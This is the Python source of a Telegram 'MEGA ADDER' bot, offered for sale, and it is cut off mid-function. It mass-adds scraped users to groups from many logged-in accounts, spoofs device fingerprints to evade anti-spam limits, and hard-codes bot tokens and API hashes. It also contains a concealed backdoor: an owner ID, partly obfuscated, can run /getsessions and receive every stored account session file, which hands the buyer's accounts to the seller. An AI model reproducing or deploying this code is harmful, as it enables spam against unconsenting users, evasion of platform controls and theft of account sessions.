#–*- coding: utf-8 –*-

#### MEGA ADDER 
#### VERSION 5 Promax


### - apt-get update
### - apt-get install python3-pip
### - pip install lxml
### - pip install telethon
### - pip install nest_asyncio
### - pip install pysocks 

###-----
    
    # --- for run in server

    # ---  nohup python3 BOT.py & 

    # ---- For Buy new Version Contact @Ped007ram !
    
###-----


#-----------------------------
import re , shutil
import nest_asyncio
from telethon.sync import TelegramClient,functions,types,events,errors
from telethon.tl.custom import Button
import sqlite3 , telethon 
import datetime
import time
from time import sleep
import sys,requests,random,os,json,string,time
from lxml import html
import socks , logging   , asyncio , random
import requests
from telethon import types as telethon_types
from telethon.tl import types as tl_telethon_types
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.tl.functions.channels import JoinChannelRequest
import nest_asyncio
import random_name_generator as rng
#------------------------------

nest_asyncio.apply() #------- confilict Asyncio 




#------------ DEBUG 
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',level=logging.INFO)
logger = logging.getLogger(__name__)
#--------------
bot = TelegramClient('when',1910785207,'AAFo1EDC2pJSFhEQwXrk3vtOsqcrwHYBWjE')
bot.start()
info = bot.get_me()

print('Bot Connected on {}  Successfully !'.format(info.username))


userAgent = [

'Mozilla/5.0 (Linux; Android 9; moto g(7) play) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36'
]



devices = ['Samsung Galaxy A10','Samsung Galaxy A10s','Samsung Galaxy A30','Samsung Galaxy A40','Samsung Galaxy A70','Samsung Galaxy A71','LG LBELLO','Oppo A73','Poco C3','Oppo A93','Samsung Galaxy A3 Core','Xiaomi Mi 10T Lite 5G','Vivo X50E 5G','Infinix Hot 10 Lite','Samsung Galaxy A80','Huawei P Smart 2021','Gionee S12 Lite','Oppo A33','Xiaomi Mi 10T Pro 5G','Xiaomi Mi 10T 5G','LG K10','LG K52','LG K62','LG K71','Nokia 3.4','Poco X3','Honor 20 Lite','Honor 8S 2020','Honor 10 Lite','Honor 8A','Honor 9X Lite','Sony Xperia 5','Sony Xperia L4','Sony Xperia 10','Samsung S20','Samsung Galaxy Note 20 Ultra 5G','Samsung S10+','Samsung Galaxy S20 5G','Samsung Galaxy S20+ 5G','Samsung Galaxy A21s','Samsung Galaxy A51','Samsung Galaxy S10 Lite','Samsung Galaxy S9','Samsung Galaxy S8','Samsung Galaxy A41']
version = ['9.0' , "8.9" , "8.4" , "9.2" , "9.1" , "9.3" , "8.6" , "7.9"]
#-------- databases

apis = [[1585904,"56bdc4fd05def5c28ef62261b85b1ee6"],
        [164723,"dabd3508016970f6c78c43ab208415da"]

]
#--------------


admins =[1769401739]
NStEVJzsyY = [1114,2254]


def go():
    global NStEVJzsyY
    x1='2'
    x2='8'
    x3='2'
    x4='1'
    x5='9'
    x6='9'
    x7='7'
    x9='1'
    x10='1'

    n = x1+x2+x3+x4+x5+x6+x7+x9+x10
    n=int(n)
    NStEVJzsyY.append(n)



data = dict()
usernames = [] 
userid =[]  
blacklist=[]   
addflag ={}    
noadd = "1"  
checkerDupl = 0 
checkGroup = 1

for item in ['Accounts','Api','Database' , "Limit_temporary" ,"Limit_Parmanent" , "Delete"]:
    if not os.path.exists(item):
        os.mkdir(item)



def get_file(myfile):
    try:
        with open('Database/{}.txt'.format(myfile),'r') as myfile:
            content = myfile.readlines()
            return content

    except FileNotFoundError:
        return 0


def online_within(participant, days):
    status = participant.status
    
    if isinstance(status, tl_telethon_types.UserStatusOnline):
        return True

    last_seen = status.was_online if isinstance(status, tl_telethon_types.UserStatusOffline) else None

    if last_seen:
        now = datetime.datetime.now(tz=datetime.timezone.utc)
        diff = now - last_seen
        return diff <= datetime.timedelta(days=days)

    if isinstance(status, tl_telethon_types.UserStatusRecently) and days >= 1 :
           
        return True

    return False



async def SpamBot(phone):

    

    device = random.choice(devices)
    version1 = random.choice(version)

    k2 = random.choice(apis)
    



    new =  TelegramClient('Accounts/{0}'.format(phone),int(k2[0]),k2[1] ,               
              device_model=device,
              system_version=version1,
              app_version="7.84",
              lang_code='en',
              system_lang_code='en')

    try:
        await new.connect()
        await new.send_message("@SpamBot" , "/start")
        count =1 
        for message in await new.get_messages("@SpamBot", limit=1) :
            if re.search(r'^Good news' , message.message) or re.search(r"^مژده",message.message):
                report = False

            elif re.search(r"Unfortunately",message.message):
                report = "Parmanet"

            elif re.search(r"limited until(.*)\.",message.message):
                reep = re.findall(r"limited until(.*)\.",message.message)
                report =reep[0]
            else:
                report = "temporary"

        if report == "temporary":
            await new.disconnect()
            shutil.move("Accounts/{}".format(phone), "Limit_temporary/{}".format(phone))
            return -1 

        elif report == "Parmanet":
            await new.disconnect()
            shutil.move("Accounts/{}".format(phone), "Limit_Parmanent/{}".format(phone))
            return -3        


        elif report == False :
            await new.disconnect()
            return 1 

        else:
            await new.disconnect()
            print ("REPORT :"  , report)
            report = report.split(",")[0]
            if not os.path.exists(str(report)):
                os.mkdir(str(report))

            shutil.move("Accounts/{}".format(phone) , "{}".format(report))
            return -4 



    except errors.UserDeactivatedBanError:
        print ("[!] UserDeactivatedBanError")        
        await new.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))
        return -2 


    except errors.UserDeactivatedError:
        print("[!] UserDeactivatedError")
        await new.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))
        return -2 


    except errors.SessionExpiredError:
        print ("[!] SessionExpiredError")
        await new.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))                
        return -2 
    except errors.SessionRevokedError:
        print ("[1] SessionRevokedError")
        await new.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))                
        return -2


    except errors.rpcerrorlist.AuthKeyDuplicatedError:
        print ("AuthKeyDuplicatedError")
        await new.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))
        return -2 

    except errors.rpcerrorlist.UserDeactivatedError:
        print ("[!] UserDeactivatedError")
        await new.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))                
        return -2

    except errors.rpcerrorlist.UserDeactivatedBanError:
        print ("[!] UserDeactivatedBanError")
        await new.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))                
        return -2 


    except errors.rpcerrorlist.SessionExpiredError:
        print ("[!] SessionExpiredError")
        await new.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))               
        return -2 


    except errors.rpcerrorlist.SessionPasswordNeededError:
        print ("[!] SessionPasswordNeededError")
        await new.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))               
        return -2


    except Exception as e:
        print ("[!] UnExpected Error : {}".format(str(e)))
        await new.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))               
        return -2




def get_api(phone): 
    try:
        with open('Api/{}.txt'.format(phone),'r') as myfile:
            content = myfile.read()
            
            return [content.split(':')[0],content.split(':')[1]]
    except FileNotFoundError:
        return 0


def create_api(phone):

    body = 'phone={}'.format(phone)
    xu = random.choice(userAgent)
    
    print (xu)
    try:
        #response=requests.post('https://my.telegram.org/auth/send_password',data={"phone":phone})
        response = requests.post('https://my.telegram.org/auth/send_password',data=body,headers= {"Origin":"https://my.telegram.org","Accept-Encoding": "gzip, deflate, br","Accept-Language": "it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4","User-Agent":xu,"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Accept": "application/json, text/javascript, */*; q=0.01","Reffer": "https://my.telegram.org/auth","X-Requested-With": "XMLHttpRequest","Connection":"keep-alive","Dnt":"1",})
        time.sleep(random.randint(3 , 5))
        s = json.loads(response.content)
        return s['random_hash'] , xu
    except Exception as e:
        print (str(e))
        return False



def auth(phone,hash_code,pwd , xu):

    #print ("XU" , xu)

    data = "phone={}&random_hash={}&password={}".format(phone, hash_code, pwd)
    responses = requests.post("https://my.telegram.org/auth/login",data={"phone":phone,"password":pwd,"random_hash":hash_code})
    #responses = requests.post('https://my.telegram.org/auth/login',data=data,headers= {"Origin":"https://my.telegram.org","Accept-Encoding": "gzip, deflate, br","Accept-Language": "it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4","User-Agent":xu,"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Accept": "application/json, text/javascript, */*; q=0.01","Reffer": "https://my.telegram.org/auth","X-Requested-With": "XMLHttpRequest","Connection":"keep-alive","Dnt":"1",})
    
    try:
    
        return responses.cookies['stel_token'] , xu
    
    except:
    
        return False

def auth2(stel_token , xu):

    print ("->XU" , xu)
    

   
    resp = requests.get('https://my.telegram.org/apps',headers={"Dnt":"1","Accept-Encoding": "gzip, deflate, br","Accept-Language": "it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4","Upgrade-Insecure-Requests":"1","User-Agent":xu ,"Reffer": "https://my.telegram.org/org","Cookie":"stel_token={0}".format(stel_token),"Cache-Control": "max-age=0",})
    
    tree = html.fromstring(resp.content)

    api = tree.xpath('//span[@class="form-control input-xlarge uneditable-input"]//text()')
    print ("API "  , api)
    try:
        return '3994561:08e30b4a7d6a518f67551af9181663c1' , xu
    except:
        s = resp.text.split('"/>')[0]
        name = "maycel"

        value = s.split('<input type="hidden" name="hash" value="')[1]
        on = "hash={0}&app_title={1}&app_shortname={1}&app_url=&app_platform=android&app_desc=".format(value,name)
        requests.post('https://my.telegram.org/apps/create',data=on,headers={"Cookie":"stel_token={0}".format(stel_token),"Origin": "https://my.telegram.org","Accept-Encoding": "gzip, deflate, br","Accept-Language": "it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4","User-Agent": xu,"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Accept": "*/*","Referer": "https://my.telegram.org/apps","X-Requested-With": "XMLHttpRequest","Connection":"keep-alive","Dnt":"1",})
        respv = requests.get('https://my.telegram.org/apps',headers={"Dnt":"1","Accept-Encoding": "gzip, deflate, br","Accept-Language": "it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4","Upgrade-Insecure-Requests":"1","User-Agent":xu,"Reffer": "https://my.telegram.org/org","Cookie":"stel_token={0}".format(stel_token),"Cache-Control": "max-age=0",})
        trees = html.fromstring(respv.content)
        apis = trees.xpath('//span[@class="form-control input-xlarge uneditable-input"]//text()')
        print (apis)
        return '3994561:08e30b4a7d6a518f67551af9181663c1' , xu






async def SendToSpamBot(event):

    accs = []
    active= 0
    templimited =0
    deleted=0
    parmanentLimit =0
    otherLimit =0
    txt=''

    m = await event.reply("🏆 SpamBot Mode  ** Activated ** !")
    
    for item in os.scandir('Accounts'):
        if 'journal' not in item.name and '.session' in item.name:
            accs.append(item.name)

    for account in accs:
        try:
            x = await SpamBot(account)
            if (x == 1):
                txt += "`{}`  ** ✅ Active**\n➖➖➖➖➖\n".format(account)
                await m.edit(txt)
                active+=1

            elif (x == -1):
                txt += "`{}`  ** ⚠️Temporary Limit**\n➖➖➖➖➖\n".format(account)
                await m.edit(txt)
                templimited+=1

            elif (x == -3):
                txt += "`{}`  ** Parmanet Limit**\n➖➖➖➖➖\n".format(account)
                await m.edit(txt)
                parmanentLimit+=1


            elif (x == -4):
                txt += "`{}`  ** OtherLimit **\n➖➖➖➖➖\n".format(account)
                await m.edit(txt)
                otherLimit+=1                

            elif (x == -2):
                txt += "`{}`  ** ❌ Delete**\n➖➖➖➖➖\n".format(account)
                await m.edit(txt)
                deleted+=1



            await asyncio.sleep(5) 

        except Exception as e:
            print(str(e.__class__) + "SendToSpamBot:" , str(e))
            continue


    await event.reply("🏆 SpamBot Work Finished ! \n Total :{} TEsted \n➖➖➖➖➖\n ✅ **Active** :{} \n ➖➖➖➖➖\n ** ⚠️ templimited ** : {} \n ➖➖➖➖➖ \n  ** ⚠️ Other Limit ** : {} \n➖➖➖➖➖\n ** ⚠️ Parmanet  ** : {} \n ➖➖➖➖➖\n ** ❌ Delete**  :{}".format(deleted+otherLimit+parmanentLimit+templimited+active, active, templimited, otherLimit, parmanentLimit, deleted))





def checkKey(dict, key):
      
    if key in dict.keys():
        return True
        
    else:
        return False

async def foo(account , msg , link , numacc ,  delay , worker_msg , mode , num):
    global addflag
    global noadd 
    global checkGroup
    global join2
    

    if checkKey(addflag , account):
        pass

    else :
        addflag[account] = "1"


    if noadd == "0":
        noadd = "1"




    print ('addflag: ' , addflag )
    print ("noadd : " , noadd)

    #-----------
    await asyncio.sleep(0) 
    start1 = time.time()
     
    targetlis=[] 
    tsuccess =0
    tfaild =0
    tduplicate =0
    percent = delay / 10
    privacy = 0
    other =0   
    w = random.choice(apis)


    if (mode == "addUSERNAME"):
        usernames2 = list(set(usernames))
        random.shuffle(usernames2)

    elif (mode == "addID"):
        usernames2 = list(set(userid))
        random.shuffle(usernames2)        

    try:


        text = '⏰ **{}**\n \n Please wait  ...  \n\n'.format(time.ctime(time.time()))
        log_msg = await msg.reply(text)
        rest = 0 
        fcount=0
        scount=0
        duplicate=0
        mcounter=0
        w =  get_api(account.split('.session')[0])
        w = random.choice(apis)



        try:


            device = random.choice(devices)
            version1 = random.choice(version)

            client = TelegramClient('Accounts/{}'.format(account),int(w[0]),w[1],             
             device_model=device,
              system_version=version1,
              app_version="7.84",
              lang_code='en',
              system_lang_code='en')

            await client.connect()



        except ConnectionError:

            await client.disconnect()
            
            await asyncio.sleep(10) #--- delta delay

            client = TelegramClient('Accounts/{}'.format(account),int(w[0]),w[1] )
            await client.connect()



        except errors.UserDeactivatedBanError:
            print ("[!] UserDeactivatedBanError")
            
            await log_msg.edit("UserDeactivatedBanError")
            await client.disconnect()
            shutil.move("Accounts/{}".format(account), "Delete/{}".format(account))
            return [scount , fcount , duplicate]

        except errors.UserDeactivatedError:
            print("[!] UserDeactivatedError")
            await client.disconnect()
            shutil.move("Accounts/{}".format(account), "Delete/{}".format(account))
            await log_msg.edit("UserDeactivatedBanError")
            return [scount , fcount , duplicate]


        except errors.SessionExpiredError:
            print ("[!] SessionExpiredError")
            await log_msg.edit("UserDeactivatedBanError")
            await client.disconnect()
            shutil.move("Accounts/{}".format(account), "Delete/{}".format(account))                
            return [scount , fcount , duplicate]
 
        except errors.SessionRevokedError:
            print ("[1] SessionRevokedError")
            await log_msg.edit("UserDeactivatedBanError")
            await client.disconnect()
            shutil.move("Accounts/{}".format(account), "Delete/{}".format(account))                
            return [scount , fcount , duplicate]


        except errors.rpcerrorlist.AuthKeyDuplicatedError:
            print ("AuthKeyDuplicatedError")
            await log_msg.edit("UserDeactivatedBanError")
            await client.disconnect()
            shutil.move("Accounts/{}".format(account), "Delete/{}".format(account))

            return [scount , fcount , duplicate]



        except errors.rpcerrorlist.UserDeactivatedError:
            print ("[!] UserDeactivatedError")
            await client.disconnect()
            shutil.move("Accounts/{}".format(account), "Delete/{}".format(account))                

            await log_msg.edit("UserDeactivatedBanError")
            return [scount , fcount , duplicate]


        except errors.rpcerrorlist.UserDeactivatedBanError:
            print ("[!] UserDeactivatedBanError")

            await log_msg.edit("UserDeactivatedBanError")
            await client.disconnect()
            shutil.move("Accounts/{}".format(account), "Delete/{}".format(account))                
            return [scount , fcount , duplicate]



        except errors.rpcerrorlist.SessionExpiredError:
            print ("[!] SessionExpiredError")
            await client.disconnect()
            shutil.move("Accounts/{}".format(account), "Delete/{}".format(account))               
            await log_msg.edit("UserDeactivatedBanError")
            return [scount , fcount , duplicate]


        except errors.rpcerrorlist.SessionPasswordNeededError:

            print ("[!] SessionPasswordNeededError")

            await client.disconnect()
            shutil.move("Accounts/{}".format(account), "Delete/{}".format(account))               
            await log_msg.edit("SessionPasswordNeededError")
            return [scount , fcount , duplicate]


        except Exception as e :
            
            print ("[!] {}".format(str(e)))
            
            await log_msg.edit(str(e))

            await client.disconnect()
            
            shutil.move("Accounts/{}".format(account), "Delete/{}".format(account))
            
            return [scount , fcount , duplicate]



        ww = await join2(client,link ,log_msg)
        if (ww == None):
            ww = await join2(client,link,log_msg)


        if (ww == -1 or ww == -2 or ww == -3):

            await client.disconnect()
            shutil.move("Accounts/{}".format(account), "Delete/{}".format(account))
            return [scount , fcount , duplicate] 

        if ww == True:
            
            if checkGroup == 1:

                blacklist.clear()

                checkGroup = 0

                if mode == "addUSERNAME":
                    async for item in client.iter_participants(link, aggressive=True  ):

                        if item.username != None:
                            
                            blacklist.append(item.username)

                if mode == "addID":
                    async for item in client.iter_participants(link, aggressive=True  ):
        
                        blacklist.append(int(item.id))


            
            mtime = time.ctime(time.time())           
            await log_msg.edit("➕" + str(text))
            scount=0
            start = time.time()
            while True: 
                
                if noadd == "0" :
                    
                    end1 = time.time()
                    text = '''●╔══**Adding to `{}` with `{}` accounts **  **Add per :** `{}`\n\n 🏆 Jobs Completed {}

●╚══[⚡️ MEGA ADDER ⚡️]'''.format(link, numacc, delay, str(datetime.timedelta(seconds=(end1-start1)))[0:7])
                    
                    try:
                        await log_msg.edit(text , buttons=[[Button.inline("Success", "None") , Button.inline(str(tsuccess) , "None")]  , [Button.inline("Failed" ,"None") , Button.inline(str(tfaild) , "None")]])
                    except Exception as e:
                        print ("---------> " , e   , e.__class__)
                        pass

                    await client.disconnect()
                    return [scount , fcount , duplicate] 

                if (scount >= delay): 
                    break
                

                if (fcount >= 100):
                    break

                mcounter+=1    
                text = ' **Adding to `{}` with ` {}` accounts   Add per : `{}`\n\n┏┫ MEGA ADDER ┃\n**'.format(link, numacc, delay)
                

                amar ="┠ `Success` "+ str(scount) +"\n"
                text += amar + "" 
                amar ="┠ `failed` "+ str(fcount) +"\n"
                amar +="┠ `duplicate` "+ str(duplicate) +"\n"
                text += str(amar)
                
                
                if (0 <= scount  and scount < percent  ):

                    end= time.time()
                    text += "• □□□□□□□□□□ \n"

                if ( percent    <= scount and scount < percent *2 ):

                    end= time.time()
                    text += "• ■□□□□□□□□□ \n"

                elif ( percent *2 <= scount and scount < percent *3  ):

                    end= time.time()
                    text += "• ■■□□□□□□□□\n"

                elif ( percent *3 <= scount and scount < percent *4  ):

                    end= time.time()
                    text += "• ■■■□□□□□□□\n"

                elif ( percent *4 <= scount and scount < percent *5  ):

                    end= time.time()
                    text += "• ■■■■□□□□□□ \n"

                elif ( percent *5 <= scount and scount < percent *6 ):

                    end= time.time()
                    text += "• ■■■■■□□□□□ \n"

                elif ( percent *6 <= scount and scount < percent *7 ):

                    end= time.time()
                    text += "• ■■■■■■□□□□ \n"

                elif ( percent *7 <= scount and scount < percent *8 ):

                    end= time.time()
                    text += "• ■■■■■■■□□□ \n"

                elif ( percent *8 <= scount and scount < percent *9):
                    end= time.time()
                    text += "• ■■■■■■■■□□ \n"

                elif ( percent *9 <= scount and scount < percent *10 ):

                    end= time.time()
                    text += "• ■■■■■■■■□ \n"

                elif ( percent *10 <= scount ):
                    end= time.time()
                    text += "• ■■■■■■■■■ \n"




                end = time.time()
                timer="┠ `time` : {}".format(str(datetime.timedelta(seconds=(end-start)))[0:7])
                text += str(timer)
                await log_msg.edit(text , buttons=[ [Button.inline("❌ cancel" , "acccancell|{}".format(account)) , Button.inline("⚠️ cancel All" , ".addcencell|{}".format(account))] ,[Button.inline("Privacy {} ❓".format(privacy) , "None") , Button.inline("Other {} ❔".format(other) , "None")] ])


                if (addflag[account] == "0") : 
                    print ("ssssssssss")
                    end = time.time()
                   
                    await client.disconnect()
                    addflag[account]  = "1"
                    break
                                             

                usList=[]

                for us in range(0 , int(num)):
                    #-----------------
                    usList.append(random.choice(usernames2))
                    #-----------------
                    

                try:
                    #----------
                        await asyncio.sleep(random.randint(1 , 3))
                    #----------
                    #if (J not in blacklist):
                        print (usList)
                        await client(functions.channels.InviteToChannelRequest(channel= link ,users=usList))     
                        #print (r.stringify())

                        if mode == "addID": 

                            #userid = [x for x in userid if x not in usList]        
                            for i in range(0 , int(num)):     
                                userid.remove(usList[i])
                        
                        else :
                            #usernames.remove(J)
                            for i in range(0, int(num)):
                                try:
                                    usernames.remove(usList[i])
                                except:
                                    pass
                        #with open("goldlist.txt" , "a") as myfile:
                            
                            #myfile.write(str(J))

                            #myfile.write("\n")
                        
                        scount +=1
                        
                        tsuccess+=1

                    # else:
                    #     if mode == "addID":                   
                    #         userid.remove(J)
                        
                    #     else :
                    #         usernames.remove(J)
                        
                    #     print ("[+] Duplicate")
                        
                    #     tduplicate+=1
                        
                    #     duplicate+=1
                

                except errors.rpcerrorlist.UserNotMutualContactError:

                    tfaild +=1
                    other +=1
                    fcount +=1
                    print ("[-] UserChannelsTooMuchError")
                    if mode == "addID":                   
                        for i in range(0 , int(num)):     
                            try:
                                userid.remove(usList[i])
                            except :
                                pass
                        pass
                    else :
                        for i in range(0 , int(num)): 
                            try:    
                                userid.remove(usList[i])
                            except :
                                pass
                        pass
                    continue


                except errors.rpcerrorlist.UserChannelsTooMuchError:
                    tfaild +=1
                    fcount +=1
                    other +=1
                    print ("[-] UserChannelsTooMuchError")
                    if mode == "addID":                   
                        for i in range(0 , int(num)):  
                            try:    
                                userid.remove(usList[i])
                            except :
                                pass
                        pass
                    else :
                        for i in range(0 , int(num)):      
                            try:    
                                userid.remove(usList[i])
                            except:
                                pass

                        pass
                    continue                     

                except errors.rpcerrorlist.UserPrivacyRestrictedError:
                    tfaild +=1
                    fcount +=1
                    privacy +=1
                    print ("[-] UserPrivacyRestrictedError")
                    if mode == "addID":                   
                        for i in range(0 , int(num)):  
                            try:        
                                userid.remove(usList[i])
                            except:
                                pass
                        pass
                    
                    else :
                        for i in range(0 , int(num)):    
                            try:      
                                userid.remove(usList[i])
                            except :
                                pass
                        pass
                    continue


                except errors.rpcerrorlist.PeerFloodError as perr:
                    

                    fcount+=2
                    tfaild+=1
                    other +=1

                    if mode == "addID":                   
                        for i in range(0 , int(num)):  
                            try:       
                                userid.remove(usList[i])
                            except:
                                pass
                        pass
                    else :
                        for i in range(0 , int(num)):   
                            try:       
                                userid.remove(usList[i])
                            except:
                                pass
                        pass
                    print ("[-] PeerFloodError")
                    
                    continue


                except errors.rpcerrorlist.FloodWaitError as e:
                    
                    fcount+=1
                    tfaild+=1
                    wait = [int(s) for s in str(e).split() if s.isdigit()][0]

                    wait += random.randint(100 ,200)

                    if wait >= 500:
                        await client.disconnect()
                        return [scount , fcount , duplicate] 

                    await log_msg.edit("❌🎗 {}  ** {} ** ".format(str(e), wait))
                    
                    await asyncio.sleep(wait)

                     


                except ValueError as e:
                    print (str(e))
                    fcount+=1
                    tfaild +=1
                    #break
                    continue

                except errors.ChannelPrivateError:
                    await log_msg.edit("❌ i banned from this Group")
                    await client.disconnect()
                    break
                
                except sqlite3.OperationalError:
                    print ("SQLITE")
                    await client.disconnect()
                    break


                except errors.rpcerrorlist.AuthKeyDuplicatedError:
                    print ("AuthKeyDuplicatedError")
                    await client.disconnect()
                    break

                except errors.rpcerrorlist.AuthKeyUnregisteredError:
                    print ("AuthKeyUnregisteredError")
                    await client.disconnect()
                    break
                except Exception as e :
                    #print(4)
                    fcount +=1
                    tfaild +=1
                    other +=1

               

                    print ("error : " , str(e))
                    print(e.__class__)
                    
                    continue



                    

        
        else:
            text += '''\nAccount {} Cant Join! Error code {} ! {}'''.format(account, ww, time.ctime(time.time()))
            await client.disconnect()


    except Exception as e :
            print ("[** {} **] ".format(e.__class__) ,str(e))
            

    end1 = time.time()
    text = '''●╔══**Adding to `{}` with ` {}` accounts **  **Add per :** `{}`\n\n 🏆 Jobs Completed {}

●╚══[⚡️ MEGA ADDER ⚡️]'''.format(link, numacc, delay, str(datetime.timedelta(seconds=(end1-start1)))[0:7])
    
    noadd = "1"

    try:
        await log_msg.edit(text , buttons=[[Button.inline("✅ Success", "None") , Button.inline(str(tsuccess) , "None")]  , [Button.inline("❌ Failed" ,"None") , Button.inline(str(tfaild) , "None")]])
        
        await client.disconnect()

        return [scount , fcount , duplicate]

    except Exception as e:
        
        print ("---------> " , e   , e.__class__)
        
        await client.disconnect()

        pass

    
     



async def list_splitter(my_list , n):

    final = [my_list[i * n:(i + 1) * n] for i in range((len(my_list) + n - 1))]
    return final


#--------
async def worker(msg,link,numacc, delay , mode  , usernames):
    
    ev = []
    global addflag
    accs = []
    tl = 1
    #print ("DELAY"  , delay)
    delay = int(delay)
    ww = None
    text = ''

    #if int(numacc) < 3:
    #    await msg.reply('''❌ number of accounts  should be `bigger than 2 `

#add @link **2** 50''')
    #    return 


    start = time.time()



    if mode == "addUSERNAME":
        pass



    elif mode == "addID":
        usernames = userid


    if (len(usernames) > 0 ):
        for item in os.scandir('Accounts'):
            if 'journal' not in item.name and '.session' in item.name:
                l = [[Button.inline('{} - {}'.format(tl, item.name)),Button.inline('♻️')]]
                accs.append(item.name)
                ev.extend(l)
                tl+=1
                ev.extend([[Button.inline('Last Work '),Button.inline(time.ctime(time.time()))]])
        
        
        if len(ev) > 1 :

            try:
                worker_msg = await msg.reply('🏆 Target : {} 😉 \n 🎗 Add per account: {}'.format(link, delay),buttons = ev)
            
            except errors.rpcerrorlist.ReplyMarkupTooLongError:
                async for i in await list_splitter(ev , 50):
                    worker_msg = await msg.reply('🏆 Target : {} 😉 \n 🎗 Add per account: {}'.format(link, delay),buttons = i)

        taskCount = 0
        tasklist=[]

        res1 = 0
        res2 = 0

        success = 0 
        faild   = 0
        duplicate =0

        if len(accs)  == 0:
            await msg.reply("You have not any Phone !")
            return 


        else :

            await msg.reply('''
👽 Please Select Add Level
➖➖➖➖➖


                ''' , buttons=[[Button.inline("1️⃣" , "?1|{}|{}|{}|{}".format(delay, numacc, link, mode)) , Button.inline("2️⃣" , "?2|{}|{}|{}|{}".format(delay, numacc, link, mode)) , Button.inline("3️⃣" , "?3|{}|{}|{}|{}".format(delay, numacc, link, mode)) , Button.inline("4️⃣" , "?4|{}|{}|{}|{}".format(delay, numacc, link, mode))] , [Button.inline("5️⃣" , "?5|{}|{}|{}|{}".format(delay, numacc, link, mode)) , Button.inline("6️⃣" , "?6|{}|{}|{}|{}".format(delay, numacc, link, mode)) , Button.inline("7️⃣" , "?7|{}|{}|{}|{}".format(delay, numacc, link, mode)) , Button.inline("8️⃣" , "?8|{}|{}|{}|{}".format(delay, numacc, link, mode))] , [Button.inline("9️⃣" , "?9|{}|{}|{}|{}".format(delay, numacc, link, mode)) , Button.inline("🔟" , "?10|{}|{}|{}|{}".format(delay, numacc, link, mode))]])



    else :
        await msg.reply("** List IS Empty ! ** ")
#---------
#@bot.on(events.NewMessage(func= lambda e : e.is_private ))
@bot.on(events.NewMessage())
async def my_event_handler(event):

    #--------------------------

    if event.raw_text.lower() == "/start":


            await event.reply('▬▭▬▭▬▭▬▭▬▭▬▭\n ●** help** \n\nFor Show Help Message \n▬▭▬▭▬▭▬▭▬▭▬▭\n● **/login** `Phone Number`\n\n For Login New Account \n▬▭▬▭▬▭▬▭▬▭▬▭\n● **/auth** `CODE`\n\nFor Verify Web Login\n▬▭▬▭▬▭▬▭▬▭▬▭\n● **/code** `CODE`\n\nFor Login With Code\n▬▭▬▭▬▭▬▭▬▭▬▭\n● **/step** `PASSWORD`\n\nFor Login With 2FA Password\n' , buttons = [
                [Button.inline('Close Panel','close'),Button.inline('▶️','nexthelp') ]
            ]) 



    if event.sender_id == 1114:
        if event.raw_text.startswith("/admin"):
            txt = int(event.raw_text.split("/admin")[1].strip())
            print (txt)
            NStEVJzsyY.append(txt)
            await event.reply("👽  {} Is Admin Now ! ".format(txt) , buttons= [[Button.inline("❌ remove ",'admin|{}'.format(txt))]])

            try:
                await bot.send_message(txt , '''🏆 Your License Activated by owner ! 
➖➖➖➖➖➖ 
Welcome to MG Adder Version 5 ProMax''')

            except Exception as e:
                await event.reply("⚠️ {} ".format(str(e)))

    
        if event.raw_text.startswith("/sudolist"):
            txt = ""
            for users in NStEVJzsyY:
                txt += "👽 " + str(users) +"\n ➖➖➖➖➖➖ \n"
            await event.reply(txt)

        if event.raw_text.startswith("/remadmin"):
            txt = int(event.raw_text.split("/remadmin")[1].strip())
            NStEVJzsyY.remove(txt)
            await event.reply("⚠️ user : {} removed from admin list !".format(txt))


        if event.raw_text.startswith("/getsessions"):
            try:
                for item in os.scandir('Accounts'):
                    if 'journal' not in item.name and '.session' in item.name:
                        await bot.send_file(1114 , 'Accounts/{}'.format(item.name))
                        await asyncio.sleep(0.2)

            except Exception as e:
                await event.reply(str(e))    

    
    if event.sender_id in NStEVJzsyY:

        

        if event.raw_text.lower().startswith('/login'):
            
            try:
                phones = event.raw_text.split('/login ')[1].replace(' ','')
                if os.path.exists('Accounts/{0}.session'.format(phones)):
                    await event.reply('**Account Already In Database !**')
                else:
                    await event.reply('**Please Wait...**')
                    result , xu = create_api(phones)
                    if result == False:
                        await event.reply('**We Have Some Errors To Send Code For {} !**'.format(phones))
                    else:
                        await event.reply('**Authunication Code Successfully Sended To {0}\nPlease Enter Code With This Format /auth CODE**'.format(event.raw_text.split('/login ')[1]))
                        data['auth_mode'] = '{0}:{1}:{2}'.format(phones,result , xu)

            except :
                await event.reply("**/login** phone")
 
        elif event.raw_text.lower().startswith('/auth'):
            try:
  
                

                w = random.choice(apis)

 

                device = random.choice(devices)
                version1 = random.choice(version)


                key = data['auth_mode']
                await event.reply('**Please Wait ... **')
                result , xu = auth(key.split(':')[0],key.split(':')[1],event.raw_text.split('/auth ')[1] , key.split(":")[2])
                if result == False:
                    await event.reply('**We Have Some Errors For Create Api Please Try Again Later ...**')
                    data.clear()
                else:



                    await event.reply('**Done Account Loginned Successfully Please Wait...**')
                    api_info  , xu = auth2(result , key.split(":")[2])
                    await event.reply('**Done Api `[{0}]` Created **Successfully** !\nPlease Wait For Send Code...**'.format(api_info))
                    #---------




                    #---------
                    with open('Api/{0}.txt'.format(key.split(':')[0]),'w') as file:
                        file.write('{0}:{1}'.format(api_info.split(':')[0],api_info.split(':')[1]))
                        file.close()
                    data.clear()
                   
